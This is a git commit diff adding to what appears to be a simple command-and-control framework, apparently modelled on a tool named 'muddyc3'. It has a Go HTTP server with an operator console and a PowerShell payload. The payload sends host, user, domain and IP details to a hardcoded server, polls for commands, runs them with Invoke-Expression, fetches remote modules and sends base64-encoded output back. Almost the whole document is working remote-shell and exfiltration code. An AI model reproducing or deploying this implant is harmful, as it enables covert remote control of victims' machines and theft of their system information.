646cf2b58585d16b0e036ca36b8efa1cf1e46a50
demonsec666 <1955270830@qq.com>
2020-01-23 22:46:41 +0800

    更新
    更新

--- main.go
+++ main.go
@@ -1,10 +1,10 @@
 package main
 
 import (
+	"bufio"
+	"encoding/base64"
 	"fmt"
-	"log"
 	"net/http"
-
 	"os"
 	"regexp"
 
@@ -12,7 +12,7 @@ import (
 )
 
 var (
-	cmd    string
+	cmd    string = ""
 	AGENTS map[string]string
 )
 
@@ -21,27 +21,30 @@ var (
 
 func sayhelloName(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
-	data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
+
 	//路由正则
 	url_info, _ := regexp.Compile("/info/*")
-	//url_md,_:=regexp.Compile("/md/*")
+	url_md, _ := regexp.Compile("/md/*")
 	url_cm, _ := regexp.Compile("/cm/*")
+	url_re, _ := regexp.Compile("/re/*")
 
 	//url path
-	fmt.Println("URL_path", r.URL.Path)
+	//fmt.Println("URL_path", r.URL.Path)
 
 	//路由/info/*
 	if url_info.MatchString(r.URL.Path) {
 		//匹配
-
+		//r.ParseForm()
 		//输出data
-
+		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
 		fmt.Println("Form", data)
+
+		//fmt.Println("Form", data)
 		AGENTS = make(map[string]string)
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		id := url_path.FindString(r.URL.Path)
-		fmt.Println(id)
-		// AGENTS[id] = "ok"
+		//fmt.Println(id)
+		AGENTS[id] = "ok"
 		// fmt.Println(AGENTS[id])
 
 	} else if url_cm.MatchString(r.URL.Path) {
@@ -50,66 +53,85 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 		//命令实现需要配合输入
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
-		value, ok := AGENTS[id]
+		_, ok := AGENTS[id]
 		if ok {
-			fmt.Println(value)
+			if cmd != "" {
+				fmt.Fprint(w, cmd)
+				cmd = ""
+				_ = r.Close
+			} else {
+				fmt.Fprint(w, "")
+			}
 		} else {
-			CMD()
-			fmt.Fprintf(w, cmd)
+			fmt.Fprintf(w, "REGISTER")
 
 		}
+
+	} else if url_re.MatchString(r.URL.Path) {
+		//r.ParseForm()
+		data := r.Form.Get("data")
+		decoded, _ := base64.StdEncoding.DecodeString(data)
+		decodestr := string(decoded)
+		fmt.Println("\n")
+		fmt.Println(decodestr)
+
+	} else if url_md.MatchString(r.URL.Path) {
+		//r.ParseForm()
+		// data := r.Form.Get("data")
+		fmt.Println("a")
 
 	} else {
 		//全都不匹配输出请求详细
 		//先强制断开连接
-		fmt.Println(r.Close)
-		//自动关闭服务器
-
-		fmt.Println("Request解析")
-		//HTTP方法
-		fmt.Println("method", r.Method)
-		// RequestURI是被客户端发送到服务端的请求的请求行中未修改的请求URI
-		fmt.Println("RequestURI", r.RequestURI)
-		//URL类型,下方分别列出URL的各成员
-		fmt.Println("URL_scheme", r.URL.Scheme)
-		fmt.Println("URL_opaque", r.URL.Opaque)
-		fmt.Println("URL_user", r.URL.User.String())
-		fmt.Println("URL_host", r.URL.Host)
-		fmt.Println("URL_path", r.URL.Path)
-		fmt.Println("URL_RawQuery", r.URL.RawQuery)
-		fmt.Println("URL_Fragment", r.URL.Fragment)
-		//协议版本
-		fmt.Println("proto", r.Proto)
-		fmt.Println("protomajor", r.ProtoMajor)
-		fmt.Println("protominor", r.ProtoMinor)
-
-		//打印全部头信息
-		for k, v := range r.Header {
-			// fmt.Println("Header key:" + k)
-			for _, vv := range v {
-				fmt.Println("header key:" + k + "  value:" + vv)
-			}
-		}
-
-		//解析body
-		//r.ParseMultipartForm(128)
-		//fmt.Println("解析方式:ParseMultipartForm")
-		r.ParseForm()
-		fmt.Println("解析方式:ParseForm")
-
-		//body内容长度
-		fmt.Println("ContentLength", r.ContentLength)
-
-		//打印全部内容
-		fmt.Println("Form", r.Form)
-
-		//该请求的来源地址
-		fmt.Println("RemoteAddr", r.RemoteAddr)
-
-		///data:=r.RemoteAddr
-		//发送邮件通知
-		//SendMail("Danger notice ！！！！",data)
-		os.Exit(0)
+		//fmt.Println(r.Close)
+		////自动关闭服务器
+		//
+		//fmt.Println("Request解析")
+		////HTTP方法
+		//fmt.Println("method", r.Method)
+		//// RequestURI是被客户端发送到服务端的请求的请求行中未修改的请求URI
+		//fmt.Println("RequestURI", r.RequestURI)
+		////URL类型,下方分别列出URL的各成员
+		//fmt.Println("URL_scheme", r.URL.Scheme)
+		//fmt.Println("URL_opaque", r.URL.Opaque)
+		//fmt.Println("URL_user", r.URL.User.String())
+		//fmt.Println("URL_host", r.URL.Host)
+		//fmt.Println("URL_path", r.URL.Path)
+		//fmt.Println("URL_RawQuery", r.URL.RawQuery)
+		//fmt.Println("URL_Fragment", r.URL.Fragment)
+		////协议版本
+		//fmt.Println("proto", r.Proto)
+		//fmt.Println("protomajor", r.ProtoMajor)
+		//fmt.Println("protominor", r.ProtoMinor)
+		//
+		////打印全部头信息
+		//for k, v := range r.Header {
+		//	// fmt.Println("Header key:" + k)
+		//	for _, vv := range v {
+		//		fmt.Println("header key:" + k + "  value:" + vv)
+		//	}
+		//}
+		//
+		////解析body
+		////r.ParseMultipartForm(128)
+		////fmt.Println("解析方式:ParseMultipartForm")
+		//r.ParseForm()
+		//fmt.Println("解析方式:ParseForm")
+		//
+		////body内容长度
+		//fmt.Println("ContentLength", r.ContentLength)
+		//
+		////打印全部内容
+		//fmt.Println("Form", r.Form)
+		//
+		////该请求的来源地址
+		//fmt.Println("RemoteAddr", r.RemoteAddr)
+		//
+		/////data:=r.RemoteAddr
+		////发送邮件通知
+		////SendMail("Danger notice ！！！！",data)
+		////os.Exit(0)
+		fmt.Fprintf(w, "") //这个写入到w的是输出到客户端的
 	}
 
 	//fmt.Fprintf(w, "Hello Wrold!") //这个写入到w的是输出到客户端的
@@ -137,21 +159,32 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 //
 //}
 
-func CMD() {
-
-	fmt.Printf("Console_shell >")
-	fmt.Scanln(&cmd) //Scanln 扫描来自标准输入的文本，将空格分隔的值依次存放到后续的参数内，直到碰到换行。
-	// fmt.Scanf("%s %s", &firstName, &lastName)    //Scanf与其类似，除了 Scanf 的第一个参数用作格式字符串，用来决定如何读取。
-
-	fmt.Printf("%s \n", cmd)
-	fmt.Println(cmd)
-
+//func CMD() {
+//
+//	fmt.Printf("Console_shell >")
+//	fmt.Scanln(&cmd) //Scanln 扫描来自标准输入的文本，将空格分隔的值依次存放到后续的参数内，直到碰到换行。
+//	// fmt.Scanf("%s %s", &firstName, &lastName)    //Scanf与其类似，除了 Scanf 的第一个参数用作格式字符串，用来决定如何读取。
+//
+//	fmt.Printf("%s \n", cmd)
+//	fmt.Println(cmd)
+//
+//}
+func Scanf(a *string) {
+	reader := bufio.NewReader(os.Stdin)
+	data, _, _ := reader.ReadLine()
+	*a = string(data)
 }
 func main() {
 	http.HandleFunc("/", sayhelloName) //设置访问的路由
 
-	err := http.ListenAndServe(":9090", nil) //设置监听的端口
-	if err != nil {
-		log.Fatal("ListenAndServe: ", err)
+	go http.ListenAndServe(":9090", nil) //设置监听的端口
+	//commline:=""
+	//cmd_list:=""
+	for true {
+
+		fmt.Print("Console_shell >")
+		Scanf(&cmd)
+		// fmt.Printf("%s \n", cmd)
 	}
+
 }
--- muddyc3/core/payload.ps1
+++ muddyc3/core/payload.ps1
@@ -1,74 +1,86 @@
-
 $hostname = $env:COMPUTERNAME;
 $whoami = $env:USERNAME;
 $arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 $os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
 $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
-$IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
-$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
-$agent="$random-img.jpeg"
-$finaldata="$os**$IP**$arch**$hostname**$domain**$whoami"
+$IP = (gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
+$random = -join ((65 .. 90) | Get-Random -Count 5 | % { [char]$_ });
+$agent = "$random-img.jpeg"
+$finaldata = "$os**$IP**$arch**$hostname**$domain**$whoami"
 $h3 = new-object net.WebClient
-      $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $h=$h3.UploadString("http://192.168.10.125:9090/infos/$agent","data="+$finaldata)
+$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+$h = $h3.UploadString("http://192.168.10.125:9090/info/$agent", "data="+$finaldata)
 
 $h2 = New-Object system.Net.WebClient;
 $h3 = New-Object system.Net.WebClient;
 
 
-      function load($module)
-      {
-
-
-
-            $handle = new-object net.WebClient;
-            $handleh = $handle.Headers;
-            $handleh.add("Content-Type", "application/x-www-form-urlencoded");
-            $modulecontent=$handle.UploadString("http://192.168.10.125:9090/md/$agent", "$module");
-
-
-
-      return $modulecontent
-      }
-
-
-
-while($true){
-$cmd = $h2.downloadString("http://192.168.10.125:9090/cm/$agent");
-
-if($cmd -eq "REGISTER"){
-$h3 = new-object net.WebClient
-      $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $h3.UploadString("http://192.168.10.125:9090/info/$agent",$finaldata)
-continue
-}
-if($cmd -eq ""){
-sleep 2
-continue
-}
-elseif($cmd.split(" ")[0] -eq "load"){
-$f=$cmd.split(" ")[1]
-$module=load -module $f
-try{
-$output=Invoke-Expression ($module)  | Out-String
-        }
-        catch{
-        $output = $Error[0] | Out-String;
-        }
-
-
+function load($module)
+{
+	
+	
+	
+	$handle = new-object net.WebClient;
+	$handleh = $handle.Headers;
+	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
+	$modulecontent = $handle.UploadString("http://192.168.10.125:9090/md/$agent", "$module");
+	
+	
+	
+	return $modulecontent
 }
 
-else{
 
-try{
-$output=Invoke-Expression ($cmd) | Out-String
-        }
-        catch{
-        $output = $Error[0] | Out-String;
-        }}
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
-$redata=[System.Convert]::ToBase64String($bytes)
-$re = $h3.UploadString("http://192.168.10.125:9090/re/$agent",$redata);
 
+while ($true)
+{
+	$cmd = $h2.downloadString("http://192.168.10.125:9090/cm/$agent");
+	#echo $cmd
+	if ($cmd -eq "REGISTER")
+	{
+		$h3 = new-object net.WebClient
+		$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+		$h3.UploadString("http://192.168.10.125:9090/info/$agent", "data="+$finaldata)
+		continue
+	}
+	if ($cmd -eq "")
+	{
+		sleep 2
+		continue
+	}
+	elseif ($cmd.split(" ")[0] -eq "load")
+	{
+		$f = $cmd.split(" ")[1]
+		$module = load -module $f
+		try
+		{
+			$output = Invoke-Expression ($module) | Out-String
+		}
+		catch
+		{
+			$output = $Error[0] | Out-String;
+		}
+		
+		
+	}
+	
+	else
+	{
+		
+		try
+		{
+			$output = Invoke-Expression ($cmd) | Out-String
+		}
+		catch
+		{
+			#$output = $Error[0] | Out-String;
+		}
+	}
+    Echo $output
+	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+	$redata = [System.Convert]::ToBase64String($bytes)
+    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+	$re = $h3.UploadString("http://192.168.10.125:9090/re/$agent", "data="+$redata);
+	
 }
+
